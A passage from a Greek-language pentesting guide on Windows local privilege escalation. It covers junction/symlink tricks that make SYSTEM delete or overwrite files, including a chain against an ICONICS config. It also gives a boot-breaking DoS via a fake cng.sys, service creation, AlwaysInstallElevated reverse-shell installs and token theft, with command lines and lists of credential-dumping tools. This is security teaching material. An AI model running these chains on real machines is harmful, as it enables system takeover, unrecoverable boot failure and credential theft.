# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Επιλογή C: Δημιουργήστε ένα **symlink** στο `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Αυτό στοχεύει στην εσωτερική ροή NTFS που αποθηκεύει τα μεταδεδομένα του φακέλου — η διαγραφή της διαγράφει τον φάκελο.

5. Βήμα 5: Απελευθέρωση του oplock
- Η διεργασία SYSTEM συνεχίζει και προσπαθεί να διαγράψει `file1.txt`.
- Αλλά τώρα, λόγω του junction + symlink, στην πραγματικότητα διαγράφει:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Αποτέλεσμα**: `C:\Config.Msi` διαγράφεται από SYSTEM.

### Από Arbitrary Folder Create σε Μόνιμο DoS

Εκμεταλλευτείτε ένα primitive που σας επιτρέπει να **create an arbitrary folder as SYSTEM/admin** — ακόμη κι αν **δεν μπορείτε να γράψετε αρχεία** ή **να ορίσετε αδύναμα δικαιώματα**.

Δημιουργήστε έναν **φάκελο** (όχι αρχείο) με το όνομα ενός **κρίσιμου Windows driver**, π.χ.:
```
C:\Windows\System32\cng.sys
```
- Αυτή η διαδρομή αντιστοιχεί συνήθως στον kernel-mode driver `cng.sys`.
- Εάν το **προ-δημιουργήσετε ως φάκελο**, τα Windows αποτυγχάνουν να φορτώσουν τον πραγματικό driver κατά την εκκίνηση.
- Στη συνέχεια, τα Windows προσπαθούν να φορτώσουν το `cng.sys` κατά την εκκίνηση.
- Βλέπει το φάκελο, **αποτυγχάνει να επιλύσει τον πραγματικό οδηγό**, και **καταρρέει ή σταματά την εκκίνηση**.
- Δεν υπάρχει **εναλλακτική λύση**, και **δεν υπάρχει ανάκτηση** χωρίς εξωτερική παρέμβαση (π.χ. επισκευή εκκίνησης ή πρόσβαση στον δίσκο).

### Από privileged log/backup paths + OM symlinks σε arbitrary file overwrite / boot DoS

Όταν μια **privileged service** γράφει logs/exports σε μια διαδρομή που διαβάζεται από ένα **writable config**, ανακατευθύνετε αυτή τη διαδρομή με **Object Manager symlinks + NTFS mount points** για να μετατρέψετε τη privileged εγγραφή σε arbitrary overwrite (ακόμα και **χωρίς** SeCreateSymbolicLinkPrivilege).

**Απαιτήσεις**
- Το config που αποθηκεύει τη στοχοθετημένη διαδρομή να είναι εγγράψιμο από τον επιτιθέμενο (π.χ., `%ProgramData%\...\.ini`).
- Δυνατότητα δημιουργίας mount point στο `\RPC Control` και ενός OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Μια privileged operation που γράφει σε εκείνη τη διαδρομή (log, export, report).

**Παράδειγμα αλυσίδας**
1. Διαβάστε το config για να ανακτήσετε τον privileged log προορισμό, π.χ. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` στο `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Ανακατευθύνετε τη διαδρομή χωρίς admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Αναμείνετε για το προνομιακό συστατικό να γράψει το log (π.χ., admin ενεργοποιεί "send test SMS"). Η εγγραφή τώρα καταλήγει στο `C:\Windows\System32\cng.sys`.
4. Επιθεωρήστε τον υπεργραμμένο στόχο (hex/PE parser) για να επιβεβαιώσετε τη διαφθορά· η επανεκκίνηση αναγκάζει τα Windows να φορτώσουν την παραποιημένη διαδρομή του οδηγού → **boot loop DoS**. Αυτό επεκτείνεται επίσης σε οποιοδήποτε προστατευμένο αρχείο που μια υπηρεσία με προνόμια θα ανοίξει για εγγραφή.

> `cng.sys` φορτώνεται κανονικά από `C:\Windows\System32\drivers\cng.sys`, αλλά αν υπάρχει ένα αντίγραφο στο `C:\Windows\System32\cng.sys` μπορεί να επιχειρηθεί πρώτα, καθιστώντας το αξιόπιστο DoS sink για κατεστραμμένα δεδομένα.



## **Από High Integrity σε SYSTEM**

### **Νέα υπηρεσία**

Εάν τρέχετε ήδη σε μια διεργασία High Integrity, η **διαδρομή προς SYSTEM** μπορεί να είναι εύκολη απλώς **δημιουργώντας και εκτελώντας μια νέα υπηρεσία**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Όταν δημιουργείτε ένα service binary βεβαιωθείτε ότι είναι ένα έγκυρο service ή ότι το binary εκτελεί τις απαραίτητες ενέργειες γρήγορα καθώς θα τερματιστεί σε 20s αν δεν είναι έγκυρο service.

### AlwaysInstallElevated

Από μια διαδικασία υψηλής ακεραιότητας μπορείτε να προσπαθήσετε να **ενεργοποιήσετε τις καταχωρίσεις μητρώου AlwaysInstallElevated** και να **εγκαταστήσετε** ένα reverse shell χρησιμοποιώντας ένα _**.msi**_ wrapper.\
[Περισσότερες πληροφορίες σχετικά με τα κλειδιά μητρώου που εμπλέκονται και για το πώς να εγκαταστήσετε ένα πακέτο _.msi_ εδώ.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Μπορείτε** [**να βρείτε τον κώδικα εδώ**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Εάν έχετε αυτά τα token privileges (πιθανότατα θα τα βρείτε σε μια ήδη διαδικασία High Integrity), θα μπορείτε να **ανοίξετε σχεδόν οποιαδήποτε διεργασία** (όχι προστατευόμενες διεργασίες) με το δικαίωμα SeDebug, **να αντιγράψετε το token** της διεργασίας, και να δημιουργήσετε μια **τυχαία διεργασία με αυτό το token**.\
Χρησιμοποιώντας αυτήν την τεχνική συνήθως **επιλέγεται κάποια διεργασία που τρέχει ως SYSTEM με όλα τα token privileges** (_ναι, μπορείτε να βρείτε διεργασίες SYSTEM χωρίς όλα τα token privileges_).\
**Μπορείτε να βρείτε ένα** [**παράδειγμα κώδικα που εκτελεί την προτεινόμενη τεχνική εδώ**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Η τεχνική αυτή χρησιμοποιείται από το meterpreter για escalation στο `getsystem`. Η τεχνική συνίσταται στο **δημιουργία ενός pipe και στη συνέχεια δημιουργία/κατάχρηση ενός service για να γράψει σε αυτό το pipe**. Έπειτα, ο **server** που δημιούργησε το pipe χρησιμοποιώντας το δικαίωμα **`SeImpersonate`** θα είναι σε θέση να **προσομοιώσει (impersonate) το token** του client του pipe (το service) αποκτώντας προνόμια SYSTEM.\
Εάν θέλετε να [**μάθετε περισσότερα σχετικά με τα named pipes διαβάστε αυτό**](#named-pipe-client-impersonation).\
Εάν θέλετε να διαβάσετε ένα παράδειγμα [**πώς να πάτε από high integrity σε System χρησιμοποιώντας named pipes διαβάστε αυτό**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Αν καταφέρετε να **hijackάρετε μια dll** που **φορτώνεται** από μια **διαδικασία** που τρέχει ως **SYSTEM**, θα μπορέσετε να εκτελέσετε αυθαίρετο κώδικα με αυτά τα δικαιώματα. Επομένως το Dll Hijacking είναι επίσης χρήσιμο για αυτό το είδος privilege escalation, και επιπλέον είναι πολύ **πιο εύκολο να επιτευχθεί από μια διαδικασία υψηλής ακεραιότητας** καθώς θα έχει **δικαιώματα εγγραφής** στους φακέλους που χρησιμοποιούνται για το φόρτωμα των dlls.\
**Μπορείτε** [**να μάθετε περισσότερα για το Dll hijacking εδώ**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Διαβάστε:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Περισσότερη βοήθεια

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Χρήσιμα εργαλεία

**Καλύτερο εργαλείο για να εντοπίσετε Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Έλεγχος για λανθασμένες διαμορφώσεις και ευαίσθητα αρχεία (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Εντοπίστηκε.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Έλεγχος για μερικές πιθανές λανθασμένες διαμορφώσεις και συλλογή πληροφοριών (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Έλεγχος για λανθασμένες διαμορφώσεις**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Εξάγει αποθηκευμένες πληροφορίες συνεδριών PuTTY, WinSCP, SuperPuTTY, FileZilla και RDP. Χρησιμοποιήστε -Thorough τοπικά.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Εξάγει credentials από το Credential Manager. Εντοπίστηκε.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Ψεκασμός (spray) συγκεντρωμένων κωδικών σε όλο το domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Το Inveigh είναι ένα PowerShell ADIDNS/LLMNR/mDNS spoofer και εργαλείο man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Βασική enumeration για privesc στα Windows**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Αναζήτηση γνωστών privesc ευπαθειών (DEPRECATED υπέρ Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Τοπικοί έλεγχοι **(Απαιτούνται δικαιώματα Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Αναζητά γνωστές privesc ευπάθειες (χρειάζεται να μεταγλωττιστεί με VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Σαρώνει το host για πιθανές λανθασμένες ρυθμίσεις (πιο εργαλείο συλλογής πληροφοριών παρά privesc) (χρειάζεται να μεταγλωττιστεί) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Εξάγει credentials από πολλά προγράμματα (precompiled exe στο github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port του PowerUp σε C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Έλεγχος για λανθασμένες ρυθμίσεις (εκτελέσιμο precompiled στο github). Δεν συνιστάται. Δεν λειτουργεί καλά σε Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Έλεγχος για πιθανές λανθασμένες ρυθμίσεις (exe από python). Δεν συνιστάται. Δεν λειτουργεί καλά σε Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Εργαλείο δημιουργημένο βάσει αυτού του post (δεν χρειάζεται accesschk για να λειτουργήσει σωστά αλλά μπορεί να το χρησιμοποιήσει).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Διαβάζει την έξοδο του **systeminfo** και προτείνει λειτουργικά exploits (τοπικό python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Διαβάζει την έξοδο του **systeminfo** και προτείνει λειτουργικά exploits (τοπικό python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Πρέπει να μεταγλωττίσετε το project χρησιμοποιώντας τη σωστή έκδοση του .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Για να δείτε την εγκατεστημένη έκδοση του .NET στον host-θύμα μπορείτε να κάνετε:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Αναφορές

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)

{{#include ../../banners/hacktricks-training.md}}
